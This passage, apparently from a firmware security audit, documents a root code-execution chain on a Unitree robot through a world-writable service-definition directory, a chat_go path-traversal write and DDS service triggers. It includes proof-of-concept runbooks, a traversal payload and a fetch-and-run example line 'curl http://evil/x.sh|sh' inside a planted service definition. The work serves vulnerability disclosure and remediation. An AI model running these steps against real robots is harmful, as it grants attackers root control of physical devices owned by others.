+  service if service config file is update.` — plus symtab symbols `ChildExecutor::Reload`@0x8c040,
+  `MasterService::RPC_ReloadService`@0x1f93e0, `ChildExecutor::LoadServiceAll`@0x2e2308 (all Virbox
+  trampolines: `adrp x16,<exec .bss>; br x16` — bodies unreadable, so semantics rest on the mscli
+  contract + runtime log, which is what this finding claims). Monitor-does-NOT-re-read verified
+  from the log: 18 `stop service success. name:robot_state` → `start service success. name:robot_state`
+  cycles in master_service.LOG, with `load child service config size:27` appearing ONLY at Init
+  (5 Init blocks for 5 boots, lines 26/52383/60153/…). All 27 directory files load at Init with
+  service name == filename (diff of dir listing vs the 27 `load child service sucess. name:X`
+  lines: exact match; load order is readdir order, not sorted — consistent with unfiltered
+  directory enumeration).
+- Severity confirmed: CRITICAL as the terminal stage of the FR OTA chain (write → arm → fire),
+  exactly as scoped by this finding.
+
+### Review corrections (factual)
+1. **"all 29 shipped files" is wrong — the directory holds 27 files** and the log says
+   `load child service config size:27`; 27 names load. (27 unsuffixed files, verified by ls
+   + log diff.) The Impact section's "27 services" is the correct number.
+2. **robot_state `SwitchService` is NOT an arming (reload) trigger** — it can only FIRE an
+   already-loaded service. I verified `unitree::robot::MSClient`'s complete method set in
+   robot_state_service (readelf symtab): ListServiceState/GetServiceState/StartService/
+   StopService only — no ReloadService. So the Pre-condition line "or robot_state SwitchService
+   network bridge" and Data-Flow step 2's "(or robot_state SwitchService)" overstate the remote
+   path: a remote-only attacker must wait for **reboot or master_service restart** to re-read the
+   poisoned file (the finding's own "or waits for reboot" branch is the correct one). Reboot is
+   cheap in practice: 5 boots in master_service.LOG (Jul 15 ×3, Jul 20 ×2) and 107 boots in
+   master_service.LOG.1 (2026-03-21 → 2026-07-14, ≈ daily cadence); after reboot the
+   DDS-reachable StartService bridge (runtime-proven: robot_state_service.LOG
+   `switch service local. name:ota_box, on:1, source:DDS, ret:0`) fires the payload.
+3. NEW same-class instances (strengthens the finding, no correction needed to its logic): the
+   boot-plan cmds `deb-update` and `ota-update` (both in decrypted etc/plan Cmd list) execute
+   **existing, world-writable root scripts**: `chmod +x /unitree/var/data/deb_update/deb_update.sh;
+   $DEBUpdateScript` and the same pattern for `/unitree/var/data/ota_update/ota_update.sh`
+   (both files mode 0666 inside 0777 directories — stat-verified). deb_update.sh runs
+   `dpkg -i` on every `*.deb` in the 0777 dir `/unitree/var/data/deb_update/deb/`. These are
+   additional reboot-persistent root-exec slots of exactly this finding's
+   config-trust-after-modification class (cf. AUD-corr-4gcm-autostart-slot, whose slot is empty —
+   these two are LIVE files).
+4. AUD-corr-service-dir-md-persistence cross-check: no contradiction found. Service dir 0777 ✓,
+   27 unsuffixed defs ✓, load count == dir file count ✓ (27/27, names==filenames). The `.md`-load
+   hop remains a WEAK-HOP and stays honestly labeled: LoadServiceAll exists only in master_service
+   (verified: no other shipped binary — mscli, ota_boxed, robot_state_service, ota_module_utils —
+   contains any ChildExecutor::LoadService* symbol), its body is a Virbox trampoline, and no
+   shipped service file carries a suffix, so extension filtering is unobservable from artifacts.
+
+## Independent Verification
+- Source cited: etc/master_service/service/*.json, decrypted master_service.json, sbin/mscli
+  usage text, var/log/master_service/master_service.LOG, master_service symtab (system import,
+  ChildExecutor/MasterService symbols)
+- I independently re-read (NOT cited by source):
+  - `etc/master_service/service/vui_service` (read in full) — `ln -s ...; start-stop-daemon ...`
+    compound shell Cmd (found by cat) — second independent shell-syntax example beyond the
+    source's bashrunner citation.
+  - master_service.LOG lines 26-52, 137/20014-20016, 52358-52420 (found by grep) — 18 stop/start
+    monitor cycles of robot_state with config load ONLY at Init; "load child cmd size:12",
+    "load planed child cmd count:13, service count:34".
+  - master_service.LOG.1 head/tail + `MasterService Parse` counts (found by grep -c) — 107 boots
+    2026-03-21→2026-07-14.
+  - readelf --dyn-syms master_service (entry 71 `system@GLIBC_2.17`) and the full FMX-magic scan
+    of all 27 service files (found by head -c3 loop).
+  - decrypted etc/path (read in full) — exactly 3 MD5 entries (cpwd/opsl/basic_service_check),
+    confirming guard 2's coverage claim; decrypted etc/plan (13 Cmd incl. placeholder
+    `reserve-01` with no cmd file — explains the 13-vs-12 cmd count discrepancy used elsewhere).
+  - /unitree/var/data/{deb_update,ota_update}/*.sh stat + content (found by find under var/)
+    — correction 3 above.
+- Independent finding: plaintext-forgeable service definitions executed through a root shell are
+  confirmed; the only overstatement was listing the (nonexistent) remote SwitchService reload
+  trigger, corrected above. The chain itself stands on reboot-arming + DDS StartService fire.
+- Verdict basis: independent re-reading, not source agent agreement.
+
+## PoC
+
+**Type: build-time PoC (malicious service-definition JSON + a drop-and-trigger runbook) — the
+write/parse/fire semantics are re-verified here from shipped artifacts, and the JSON was
+validated structurally against the 27 shipped definitions. Reachability of the *write* is
+inherited from whichever feeder is used (both are near-source-primary after the broker-ACL
+field test).**
+
+### Reproduction
+
+```
+# 0. Pick the write feeder (both are CONFIRMED primitives; neither needs FMX crypto):
+#    (a) OTA tar-slip  (AUD-ota-tar-traversal, CONFIRMED):
+#        a tar member named  ../../../../../../unitree/etc/master_service/service/<name>
+#        inside a module .upk extracts as ROOT into the service dir (tar_extract_all does
+#        snprintf("%s/%s", prefix, pathname) with NO canonicalization, TAR_NOOVERWRITE unset,
+#        + attacker-controlled lchown/chmod).  Delivery of the .upk requires a cloud-role
+#        publisher (field test 2026-08-20: attacker publish to cmd/<SN> is broker-DROPPED),
+#        so post-field-test this feeder is near-source / cloud-credential-contingent.
+#    (b) chat_go api-1006 knowledge write (AUD-chatgo-knowledge-write-traversal, CONFIRMED):
+#        rt/api/gpt/request api_id 1006, parameter
+#        [{"uid":"../../../../etc/master_service/service/pwn","content":"<JSON>"}]
+#        -> root write of /unitree/etc/master_service/service/pwn.md  (4 ../ segments:
+#        knowledge_dir_ = /unitree/robot/config/chat_go/knowledge is 4 levels below /unitree).
+#        Near-source DDS = unconditional (shipped AP passphrase + shipped etc/ds/ identity).
+#    (c) ANY local uid, no primitive needed at all: the directory itself ships 0777 and the
+#        definitions ship 0666 (stat-verified) — a plain `cat >` rewrites any of the 27 root
+#        command definitions (see AUD-corr-service-dir-md-persistence).
+
+# 1. Drop the definition (variant (c) shown; (a)/(b) land the same bytes):
+cat > /unitree/etc/master_service/service/audit_poc <<'EOF'
+{ ... JSON below ... }
+EOF
+
+# 2. ARM + FIRE — see "Trigger" below; local mscli, or reboot (+ optional DDS StartService).
+```
+
+### The payload — a plaintext service definition
+
+Every shipped definition is exactly this shape (verified against all 27 files; `ota_box` is the
+smallest at 307 B and `stereo_patch_pc1` shows the optional `Delay` field). The `Cmd` strings
+are **full shell lines** — `service/bashrunner` starts with `export CYCLONEDDS_URI=...;` (a
+shell *builtin* + `;` separator, impossible under plain `execve`) and `service/vui_service`
+with `ln -s ... ;` — proving master_service runs them through a shell. It imports
+`system@GLIBC_2.17` (readelf --dyn-syms, entry 71).
+
+```json
+{
+    "Start": {
+        "Cmd": "bash -c 'id > /tmp/poc_marker 2>&1'",
+        "ExpectCode": [0]
+    },
+    "Stop": {
+        "Cmd": "/bin/true",
+        "ExpectCode": [0, 1]
+    },
+    "Status": {
+        "Cmd": "/bin/true",
+        "AliveCode": [0],
+        "DeadCode": [1, 3]
+    }
+}
+```
+
+Nothing validates the content: service JSONs are plaintext, unsigned and unhashed (all 27
+shipped files fail the `FMX` magic check); the `"path"` file's MD5s cover only
+`cpwd`/`opsl`/`basic_service_check`; `ExpectCode`/`AliveCode` are *post-execution* checks; and
+the `forbid`/`protect`/`conflict` lists are control-flow policy over known names, not content
+validation. Guard table above — all four guards are ineffective against this payload.
+
+### Where to drop it — and the two drop variants
+
+Target: **`/unitree/etc/master_service/service/`** — mode **0777**, definitions mode **0666**
+(stat-verified in the image), enumerated by `ChildExecutor::LoadServiceAll` at every
+master_service Init (`ChildServiceDirectory` in decrypted `master_service.json`; runtime log
+`load child service config size:27` == the directory's file count, names == filenames, load
+order = readdir order). Service name == filename, used verbatim.
+
+- **Variant A — overwrite an existing, plan-listed service (auto-fires at boot, no RPC needed).**
+  Pick a name that is BOTH in the directory AND in the decrypted `plan` Service list, e.g.
+  `bashrunner`, `vui_service`, `chat_go`, `robot_state`. Overwrite the whole file. On the next
+  reboot master_service re-reads it (`LoadServiceAll` runs only at Init — verified from the
+  log: `load child service config size:27` appears exactly once per boot, 5 Init blocks for 5
+  boots) and the boot plan then *starts* it, executing the injected `Start.Cmd` as root.
+  107 boots in `master_service.LOG.1` over 2026-03-21→2026-07-14 (≈ daily) bound the wait.
+- **Variant B — a new file name (persistence-grade, needs one StartService after the reboot).**
+  The plan/init/manual/once lists are fixed FMX files the attacker cannot append to, so a
+  *new* name is loaded but not auto-started. After the reboot it is startable by name through
+  the network-reachable bridge. This is the AUD-corr-service-dir-md-persistence composition
+  (the `.md`-suffixed knowledge write lands here; the `.md`-load hop is that finding's
+  honestly-labeled WEAK-HOP).
+
+### Trigger
+
+| Path | Who can do it | How |
+|---|---|---|
+| **Local, immediate** | any process on the robot | `mscli reloadservice audit_poc && mscli startservice audit_poc` — `RPC_ReloadService` re-reads the file from disk (mscli usage text: *"reload service if service config file is update."*), then `RPC_StartService` runs the new `Cmd` as root. Equivalently the raw-socket client in AUD-msvc-unauth-rpc-socket's PoC with verbs `ReloadService` / `StartService`. |
+| **Reboot (arming) + auto-fire** | nobody needs to do anything | Variant A: `LoadServiceAll` at Init re-reads the poisoned file and the boot plan starts it. |
+| **Reboot (arming) + network fire** | any DDS peer | Variant B: after the reboot, `rt/api/robot_state/request` api_id 1001 `RPCServiceSwitch` `{"name":"audit_poc","switch":1}` → `SwitchServiceLocal` (`robot_state_service@0x50856c`) → `MSClient::StartService` → root shell. **Production-proven live**: `robot_state_service.LOG:168156` `switch service local. name:ota_box, on:1, source:DDS, ret:0` (`ret:0` = the MSClient call through `master_service.sock` succeeded). ForbiddenService is a 2-entry denylist and ProtectedService only blocks *stopping* — **start of anything is allowed**. |
+
+**No remote `ReloadService` exists (R6 review correction #2, load-bearing for the trigger
+table):** `unitree::robot::MSClient` in robot_state_service exposes exactly
+`ListServiceState / GetServiceState / StartService / StopService` — `ReloadService`,
+`RestartService`, `ExecuteCmd` and `RemoveService` are reachable only through the local UNIX
+socket. So a network-only attacker cannot skip the reboot; the finding's own "or waits for
+reboot" branch is the correct remote path, and the Data-Flow step 2 "(or robot_state
+SwitchService network bridge)" wording should be read as *fire-only, not arm*.
+
+### Harmless verification
+
+```bash
+# on the robot, after the drop + trigger:
+$ cat /tmp/poc_marker
+uid=0(root) gid=0(root) groups=0(root)          # Start.Cmd ran as root
+$ grep -n "audit_poc" /unitree/var/log/master_service/master_service.LOG
+... load child service sucess. name:audit_poc   # Variant B, after the reboot
+... start service success. name:audit_poc       # the fire
+```
+
+Prerequisites: a write into `/unitree/etc/master_service/service/` (feeder (a) OTA tar-slip,
+(b) chat_go api-1006, or (c) any local uid — the directory is 0777) plus one trigger from the
+table. No cryptography of any kind is involved: service JSONs are plaintext.
+
+Limitations (honest): not executed on a device. The payload's JSON shape, the 0777/0666
+directory modes, the plaintext/unsigned nature of all 27 definitions, the
+load-once-at-Init reload semantics, the `plan` Service list membership used by Variant A, and
+the live DDS→socket bridge are each re-verified from shipped artifacts here; the one hop that
+remains a WEAK-HOP is Variant B's `StartService(<never-started name>)` (master_service's
+`RPC_StartService` body is Virbox-virtualized) — Variant A avoids it entirely, and the shipped
+log's 18 `stop/start service success. name:robot_state` cycles prove the stop/start code path
+itself runs constantly in production.
+
+### Same-class instances found during review (do not fix only the service dir)
+
+The decrypted boot plan adds two more LIVE slots of exactly this trust-after-modification
+class, both world-writable right now: `deb-update` and `ota-update` execute
+`chmod +x /unitree/var/data/deb_update/deb_update.sh; $DEBUpdateScript` and the same pattern
+for `/unitree/var/data/ota_update/ota_update.sh` (files 0666 in 0777 dirs, stat-verified;
+`deb_update.sh` additionally runs `dpkg -i` on every `*.deb` in a 0777 dir). Those need no
+feeder and no reload at all — they fire at every boot.
+# Finding: AUD-corr-service-dir-md-persistence
+
+## Primitive
+
+Cross-module composition (Trust After Modification + deployment permissions) — the chat_go `.md`-suffixed arbitrary-content arbitrary-path write (AUD-chatgo-knowledge-write-traversal) lands **directly inside the world-writable master_service service-definition directory** (`/unitree/etc/master_service/service/`, mode 0777, definitions are *unsuffixed* files loaded by directory enumeration), giving a boot-persistent root-service-definition plant that resolves the "UNVERIFIED, flagged for correlation" question inside AUD-chatgo-knowledge-write-traversal. The directory itself shipping 0777 additionally makes every plaintext service definition writable by ANY local uid — the same deployment class as AUD-bashrunner-worldwritable-whitelist, but for the PID-1 supervisor's command table.
+
+## Severity
+
+HIGH (near-source write primitive → root RCE at next master_service reload/boot; slower than the bashrunner-whitelist terminal of the same chain — reboot-gated — but strictly more persistent and it removes the bashrunner-restart dependency as an alternative terminal). **Reachability corrected 2026-08-20 after the broker-ACL field test:** the fully-remote (Internet + SN) leg of the write primitive is BLOCKED at the broker (publish `cmd/<SN>` dropped under every variation tested — field-test-cmd-publish-matrix.md), so the live primary ingress is the **near-source** DDS path (LAN 192.168.123.x or the shipped WiFi-AP passphrase + shipped DDS identity material in `etc/ds/`), which is unconditional. Residual unverified remote path: the AWS KVS signaling channel. Same reclassification already applied to the parent finding AUD-chatgo-knowledge-write-traversal.
+
+## Condition Analysis
+
+### Summary
+
+AUD-chatgo-knowledge-write-traversal (CRITICAL) established that `rt/api/gpt/request` api 1006 → `ConfigManager.save_knowledge` builds `f"{knowledge_dir}/{uid}.md"` with unvalidated `uid` — an arbitrary-content write to ANY path, filename forced to end `.md`. Its Impact section flagged the master_service pivot as *"whether a `.md`-suffixed file is enumerated as a service is a binary-side question (grp-bin-003) — UNVERIFIED"*. Correlation resolves it:
+
+1. **Service definitions are unsuffixed files** in `/unitree/etc/master_service/service/` — all 27 (e.g. `bashrunner`, `robot_state`, `ota_box`; `ls` on the image). The JSON content carries `Start/Stop/Status.Cmd` strings which master_service executes through a shell as root (AUD-msvc-service-cmd-file-rce).
+2. **The loader enumerates the directory.** `ChildServiceDirectory: "/unitree/etc/master_service/service"` (decrypted `master_service.json`); the shipped runtime log shows `load child service config size:27` (master_service.LOG:26) — exactly the number of files in the directory — followed by per-file `load child service sucess. name:<file>` lines. There is no extension filter in evidence anywhere: a file named `pwn.md` containing valid service JSON parses identically (the knowledge write's content is fully attacker-controlled, so it can be pure JSON — the `.md` suffix rides only on the FILENAME, which master_service uses verbatim as the service name).
+3. **The directory ships mode 0777** (stat-verified: `777 /unitree/etc/master_service/service/`). This is independent of the traversal write — it means ANY local principal (no traversal needed) can rewrite any of the 27 root command definitions, exactly the AUD-bashrunner-worldwritable-whitelist class but for the supervisor itself.
+
+Composition: one api-1006 message (near-source DDS, or remote via the broker-gated MQTT→WebRTC leg — see Severity) with `uid = "../../../../etc/master_service/service/pwn` plants `/unitree/etc/master_service/service/pwn.md` = `{"Start":{"Cmd":"curl http://evil/x.sh|sh"}}`. After the next master_service Init (reboot; the service set is loaded once — AUD-msvc-service-cmd-file-rce's reload semantics), the service `pwn.md` exists in the loaded table and is startable by name through the network-reachable service-control bridge (`rt/api/robot_state/request` RPCServiceSwitch → `MSClient::StartService`; MQTT `moduleSwitch` → same — grp-bin-009: "start of anything ... allowed", ForbiddenService is only a two-entry denylist and ProtectedService only blocks *stopping*). Alternatively the plan/manual lists are fixed files the attacker cannot append to, so auto-start at boot is not granted — the plant needs one StartService RPC after reboot, which is unauthenticated DDS and WebRTC-registered (webrtc_bridge.LOG:5397).
+
+### Why the bashrunner terminal remains the primary chain
+
+The same api-1006 write can instead plant `/unitree/module/bashrunner/command_execution/pwn.md` and fire `{"script":"pwn.md"}` after a bashrunner restart (remotely triggerable via RPCServiceSwitch — no reboot). The service-dir variant documented here is the **persistence-grade** terminal: it survives cleanup of the bashrunner whitelist, re-arms at every boot, and is a distinct root exec path (defense-in-depth evasion). Both terminals share the identical write primitive; auditors/remediators must close the `uid` traversal, not just one landing spot.
+
+### Pre-conditions
+
+- Identical to AUD-chatgo-knowledge-write-traversal: one unauthenticated `rt/api/gpt/request` api 1006 publish. **Reachability (post-field-test):** near-source DDS with shipped identity material is the unconditional path; the fully-remote MQTT→WebRTC variant is broker-blocked (publish `cmd/<SN>` dropped — field-test-broker-acl.md / field-test-cmd-publish-matrix.md); `rt/api/gpt/request` remains a registered bridge writer (webrtc_bridge.LOG:5395), so the chain re-arms fully-remote if any WebRTC offer-ingress bypass of the broker ACL is ever found (AWS KVS signaling channel unverified).
+- Arming trigger: one master_service Init = robot reboot (power cycle) — the loaded service table is snapshotted at Init (AUD-msvc-service-cmd-file-rce reload semantics; robot_state's MSClient exposes Start/Stop only, not ReloadService, so a remote ReloadService is NOT available to skip the reboot).
+- Fire trigger: `rt/api/robot_state/request` RPCServiceSwitch `{"name":"pwn.md","switch":1}` (or MQTT `moduleSwitch`) after the reboot. WEAK-HOP: StartService of a never-before-started service name is expected to work ("start of anything allowed") but was not traced into master_service's RPC_StartService body (Virbox-virtualized); falsifier = one live `mscli startservice <name>` of a planted definition.
+
+### Data Flow
+
+1. Attacker publishes `rt/api/gpt/request` api 1006 with parameter `[{"uid":"../../../../etc/master_service/service/pwn","content":"{\"Start\":{\"Cmd\":\"curl http://evil/x.sh|sh\"}}"}]` (config_thread.py:249-254 → config_manager.py:146-156 → 204-211 — path and content citations per AUD-chatgo-knowledge-write-traversal). **Note: FOUR `../` segments, not three** — `knowledge_dir_` resolves to `/unitree/robot/config/chat_go/knowledge` (const.py:4 `SYS_CFG_DIR = '/unitree/robot/config/chat_go'` + config_manager.py:52/65), which is 4 levels below `/unitree`; three hops would land in `/unitree/robot/etc/...`.
+2. Root chat_go writes `/unitree/etc/master_service/service/pwn.md` (0777 directory — write succeeds regardless).
+3. Robot reboots; master_service `LoadServiceAll` enumerates the directory → `load child service config size:28` → service `pwn.md` parsed and registered (Cmd string held in memory).
+4. Attacker publishes `rt/api/robot_state/request` RPCServiceSwitch `{"name":"pwn.md"}` → `SwitchServiceLocal` → `MSClient::StartService("pwn.md")` → master_service `ExecuteServiceStart` → `system("curl http://evil/x.sh|sh")` as root.
+
+### Taint Trace
+
+```
+Source: Request_.parameter JSON "uid" on rt/api/gpt/request api 1006 (unauth DDS near-source with shipped identity material, or remote via the MQTT `cmd/<SN>` → `webrtcConnectRequest` → WebRTC data-channel bridge — `rt/api/gpt/request` is a registered bridge writer, webrtc_bridge.LOG:5395; the MQTT leg is broker-gated, see Review)
+  ↓ config_thread.py:362-366 json.loads → _upload_knowledge (config_thread.py:249-254)
+  ↓ Guard: NONE on uid (config_manager.py:204-211) — effective: no (AUD-chatgo-knowledge-write-traversal)
+  → Sink 1: open("/unitree/etc/master_service/service/pwn.md","w") + write(content) — EFFECT: IO
+     (arbitrary-content write into the 0777 root service-definition directory)
+  ↓ master_service LoadServiceAll directory enumeration at Init (master_service.json
+     ChildServiceDirectory; runtime log "load child service config size:27" == directory file count)
+    Guard: NONE — no extension filter, no signature/hash on service files (AUD-msvc-service-cmd-file-rce guard table)
+  → Sink 2: ExecuteServiceStart("pwn.md") → system(Cmd) as root — EFFECT: EXEC
+     (triggered by unauth RPCServiceSwitch / MQTT moduleSwitch after reboot)
+Vulnerability class: File Upload/Path Traversal × Configuration Trust-After-Modification (cross-module)
+```
+
+### Guard Assessment
+
+| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
+|---|-------|----------|----------------|------------|-------------|
+| 1 | uid validation in save_knowledge | config_manager.py:204-211 | none | NO | AUD-chatgo-knowledge-write-traversal |
+| 2 | service-file extension filter | LoadServiceAll (Virbox — unreadable) | (hypothesized) | NO EVIDENCE OF ONE | all shipped defs are unsuffixed; load count == directory file count; `.md` name would load as service "pwn.md" — WEAK-HOP (see falsifiers) |
+| 3 | service dir permissions | /unitree/etc/master_service/service/ (0777) | who may write defs | NO | world-writable by deployment (this finding's second primitive) |
+| 4 | FMX encryption of service files | — | content confidentiality | NO | service files are PLAINTEXT (only cmd/* are FMX; AUD-msvc-service-cmd-file-rce guard 1) |
+| 5 | Forbidden/Protected lists | robot_state RPCServiceSwitch | stop of protected services | NO for this | denylist of 2; START of anything is allowed; neither list gates a *new* service name |
+| 6 | plan/manual auto-start lists | decrypted plan/manual | which services start at boot | PARTIAL | pwn.md not in the fixed lists → needs one StartService RPC (unauth) after reboot |
+
+### Impact
+
+- A second, persistence-grade terminal for the fully-remote CHAIN-D write primitive, independent of the bashrunner whitelist.
+- The 0777 service directory alone is a local-privesc surface equal in strength to AUD-bashrunner-worldwritable-whitelist: any local uid rewrites any root command definition (no traversal, no DDS needed).
+- Remediation must cover BOTH the `uid` traversal AND the directory permissions AND (ideally) an extension/allowlist on LoadServiceAll — closing only the bashrunner terminal leaves this one live.
+
+### Origin
+
+- **Group**: correlation (mod-003/004/009 chat_go write primitive × grp-bin-003 master_service loader/deployment)
+- **Files**: `module/chat_go/g1/config_manager.py:204-211` (write), `audit/decrypted/etc/master_service.json` (ChildServiceDirectory), `etc/master_service/service/` (27 unsuffixed files, dir 0777 stat-verified), `var/log/master_service/master_service.LOG:26-30` (enumeration count == file count), `module/robot_state/robot_state_service` RPCServiceSwitch@0x5034c0 / SwitchServiceLocal@0x50856c (grp-bin-009 profile), `webrtc_bridge.LOG:5395/5397` (both topics bridge-registered)
+
+## Confidence
+
+7 — the write primitive, directory permissions, plaintext-JSON semantics, boot/plan execution of net-init-class cmds, and the "start of anything" service-control posture are all verified from shipped artifacts; the directory-enumeration-of-`.md` step rests on strong indirect evidence (load count == file count, unsuffixed names, no filter observed anywhere) but LoadServiceAll's body is Virbox-virtualized and unreadable — marked WEAK-HOP with falsifier.
+
+## Review: REVISED
+- Original classification: HIGH, "fully-remote write primitive".
+- Revised classification: HIGH, **near-source-primary** (fully-remote leg broker-blocked per the 2026-08-20 field test). Severity retained; reachability label corrected in Severity / Pre-conditions / Taint Trace above.
+- Also corrected in place: the illustrative payload in Data Flow step 1 used **three** `../` segments; `knowledge_dir_` = `/unitree/robot/config/chat_go/knowledge` is 4 levels below `/unitree`, so the working payload needs **four** (`../../../../etc/master_service/service/pwn`). Same off-by-one was already corrected in the parent finding AUD-chatgo-knowledge-write-traversal; the primitive itself (uid traverses to arbitrary depth) is unaffected.
+- Taint trace verified: yes — `save_knowledge` re-read directly at `module/chat_go/g1/config_manager.py:203-210`: `uid = one_knowledge['uid']; file_name = f"{self.knowledge_dir_}/{uid}.md"; open(file_name,'w').write(one_knowledge['content'])` — zero validation, `.md` suffix appended to the FILENAME only, content fully attacker-controlled. `knowledge_dir_` resolution traced end-to-end: const.py:4 `SYS_CFG_DIR = '/unitree/robot/config/chat_go'` → util.py:948 `get_sys_cfg_dir()` → config_manager.py:52/65 `knowledge_dir_ = f"{sys_cfg_dir}/knowledge"` (the PermissionError/Exception fallbacks at :78/:89 use `get_data_dir()/knowledge` = `/unitree/module/chat_go/data/knowledge`, which is ALSO 4 levels below `/unitree` — the 4-hop count holds on every branch). `/unitree/robot/config/chat_go/knowledge/` exists in the image (empty, mode 0777).
+- Deployment facts re-verified independently:
+  - `etc/master_service/service/` is **0777** (stat) and **all 27 definition files are 0666** — stronger than the finding states: not just the directory, every plaintext root Cmd definition is world-writable, so the "any local principal rewrites any root command definition" impact needs no traversal at all.
+  - All 27 definitions are **extensionless** (ls): ai_sport … webrtc_signal_server. No `.json`, no `.md`, no suffix convention anywhere.
+  - `master_service.LOG:26` `load child service config size:27` == exactly the 27 files present, followed by 27 `load child service sucess. name:<file>` lines whose names are the FILENAMES verbatim — and the service JSONs contain no `Name` field (checked on `stereo_patch_pc1`), so the service name is necessarily derived from the filename. A file named `pwn.md` would therefore be a service named `pwn.md`.
+- **WEAK-HOP fairly labeled — and stronger than the finding states.** I cross-checked the previous firmware generation's log: `master_service.LOG.1` (2026-03) shows `load child service config size:26` with a loaded set that includes `dex3_service_l`, `dex3_service_r`, `r1_stereo_patch_pc1` — three definitions that do NOT exist in the 1.4.2 directory — and lacks `stereo_patch_pc1`, `system_journal`, `video_hub`, `videohub_rtsp_server`, which do. The loaded count and name set track the directory contents exactly across two firmware generations with different file sets. That is directory enumeration, not a fixed or plan-driven list. The residual uncertainty is narrower than "no filter anywhere": a hypothetical name filter that happens to accept every shipped extensionless name but rejects dots would still be consistent with all observed data — so the `.md`-load hop stays a WEAK-HOP, but it is now a single conditional on top of a demonstrated directory-enumeration loader.
+- Guard table verified: guard 6 (`manual` list) confirmed — decrypted `etc/manual` = `[ai_sport, auto_test_arm, auto_test_low, stereo_patch_pc1]`, i.e. plan membership does not by itself auto-start a service, so the post-reboot StartService RPC is genuinely required (as the finding states). Guards 1/3/4/5 re-checked against the artifacts; none gates a *new* service name.
+- Verdict: the composition is real and the analysis is honest about its one unproven hop. HIGH retained: the write primitive is confirmed and unconditional near-source, the plant directory and plaintext Cmd semantics are confirmed, the loader demonstrably enumerates the directory, and the StartService trigger is near-certain once the definition loads (master_service registers a `StartService` handler and demonstrably starts arbitrary loaded names — 24 distinct `start service success` names in the current log). The reboot dependency and the single WEAK-HOP are the only discounts, and both are stated in the finding.
+
+## Independent Verification
+- Source cited: config_manager.py:204-211, decrypted/etc/master_service.json, etc/master_service/service/ (27 unsuffixed, 0777), master_service.LOG:26-30, robot_state_service RPCServiceSwitch@0x5034c0 / SwitchServiceLocal@0x50856c, webrtc_bridge.LOG:5395/5397
+- I independently re-read (NOT cited by source):
+  - **`master_service.LOG.1` (previous firmware generation)** — the 26-vs-27 cross-generation comparison above. This is new evidence *for* the enumeration claim that the source did not have.
+  - **`module/chat_go/const.py:3-4`** (`WORK_DIR`, `SYS_CFG_DIR`) + **`util.py:423-433/948-953`** + **`config_manager.py:19/52/65/78/89`**: the full `knowledge_dir_` resolution chain, which both fixes the payload off-by-one and proves the 4-hop count is branch-independent.
+  - **`etc/master_service/service/stereo_patch_pc1`** (file content): Start/Stop/Status only, **no `Name` field** — proves the service name comes from the filename.
+  - **`ls -la etc/master_service/service/`**: the 0666 file modes (the finding only claims the 0777 directory).
+  - **decrypted `etc/manual`**: confirms `stereo_patch_pc1` etc. are manual-start, i.e. plan membership ≠ auto-start — the reason the post-reboot StartService RPC is needed.
+- Independent finding: the file-level 0666 modes make the *local* half of this finding strictly stronger than written (any local uid rewrites `bashrunner`/`robot_state`/`ota_box` Cmd strings directly, no traversal, no `.md` suffix question, and no reboot if the service is merely restarted) — this is worth folding into remediation guidance even though the remote-write half is the headline.
+
+## Review (field-test reachability note, 2026-08-20)
+Publish to `cmd/<SN>` is dropped at the broker under all 12 tested variations (QoS 0/1, retain, clientId shape, topic case/suffix), so the MQTT→WebRTC leg of the write primitive is blocked for internet attackers. The near-source DDS path (shipped WiFi-AP passphrase or LAN presence + shipped DDS identity) is unaffected and unconditional, and the persistence terminal itself (boot-time load + StartService) is entirely local and therefore unaffected by the broker ACL. Classification updated above; severity retained on the near-source primary.
+
+## PoC
+
+### Reproduction
+
+```bash
+# 0. Shipped DDS identity + generated types out of the image:
+cp -r  <img>/etc/ds               ./ds
+cp     <img>/etc/cyclonedds.xml   ./cyclonedds.xml
+cp -r  <img>/module/chat_go/unitree_api ./unitree_api      # or any module's copy of the IDL
+# 1. export CYCLONEDDS_URI=file://$PWD/cyclonedds.xml  (edit NetworkInterface to yours)
+#    export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$PWD/lib
+pip install cyclonedds==0.10.2
+# 2. Network position: LAN 192.168.123.0/24 (eth0 — what cyclonedds.xml binds); the
+#    fully-remote MQTT->WebRTC leg is broker-ACL-blocked (field test 2026-08-20).
+# 3. Targets ship enabled and root: chat_go (the writer), master_service (the loader),
+#    robot_state_service (the StartService bridge). The service dir ships 0777 with all
+#    27 definition files 0666 — nothing to configure on the robot.
+```
+
+### Strategy
+
+Three legs with one reboot in the middle. **Leg A** publishes the api-1006 knowledge
+upload on `rt/api/gpt/request` with `uid = "../../../../etc/master_service/service/pwn"`
+— **four** `../` segments (R13-corrected: `knowledge_dir_` =
+`/unitree/robot/config/chat_go/knowledge` sits 4 levels below `/unitree`; `os.path.normpath`
+of the 4-hop uid + `.md` = `/unitree/etc/master_service/service/pwn.md`, while 3 hops land
+at `/unitree/robot/etc/...`), and `content` = a complete plaintext service definition
+(same Start/Stop/Status shape as the shipped `etc/master_service/service/bashrunner`)
+whose `Start.Cmd` is a harmless marker command. `save_knowledge`
+(config_manager.py:204-211) interpolates the uid into `f"{knowledge_dir_}/{uid}.md"` with
+zero validation and writes it as root. **Arm:** reboot — master_service's `LoadServiceAll`
+at Init re-enumerates the directory, so the log count goes 27 → 28 (this is also the
+WEAK-HOP check: if the count stays 27, a name filter exists and the hop is falsified).
+**Leg B** (post-reboot) publishes api 1001 `RPCServiceSwitch`
+`{"name":"pwn.md","switch":1}` on `rt/api/robot_state/request` → `SwitchServiceLocal` →
+`MSClient::StartService("pwn.md")` → master_service `system(Start.Cmd)` as root.
+
+### Prerequisites
+
+- Offline mode: Python 3.8+, no deps. Replays the verbatim shipped `save_knowledge`
+  (AST-extracted from `module/chat_go/g1/config_manager.py`) into a sandbox standing in
+  for `/`, and prints the loader evidence from the shipped logs.
+- DDS mode: cyclonedds 0.10.2 + shipped identity + LAN position; one robot reboot between
+  Leg A and Leg B (the service table is snapshotted at Init — `robot_state`'s MSClient
+  exposes Start/Stop only, no remote ReloadService).
+- `pwn.md` is not in the plan/manual auto-start lists (decrypted `etc/manual` =
+  `[ai_sport, auto_test_arm, auto_test_low, stereo_patch_pc1]`), so Leg B is required.
+
+### Code
+
+```python
+#!/usr/bin/env python3
+"""PoC — AUD-corr-service-dir-md-persistence: api-1006 write -> master_service boot plant.
+
+--mode offline (default, harmless): replays the verbatim shipped save_knowledge into a
+  sandbox replicating /unitree/etc/master_service/service (0777), then prints the
